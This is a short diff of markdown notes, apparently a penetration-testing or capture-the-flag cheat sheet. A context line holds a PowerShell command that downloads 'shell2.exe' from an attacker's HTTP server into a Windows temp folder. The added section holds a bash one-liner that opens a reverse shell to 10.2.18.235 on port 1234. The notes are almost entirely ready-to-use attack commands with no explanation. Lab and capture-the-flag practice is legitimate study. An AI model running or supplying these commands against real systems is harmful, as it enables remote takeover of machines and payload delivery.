@@ -7,3 +7,5 @@
 - Download the exploit file from http.server:  
 `powershell -c "Invoke-WebRequest -uri 'http://10.2.18.235:8000/shell2.exe' -OutFile 'C:\Windows\Temp\shell.exe'"`  
 
+## Reverse Shell
+rShell.sh: `bash -i >& /dev/tcp/10.2.18.235/1234 0>&1`  
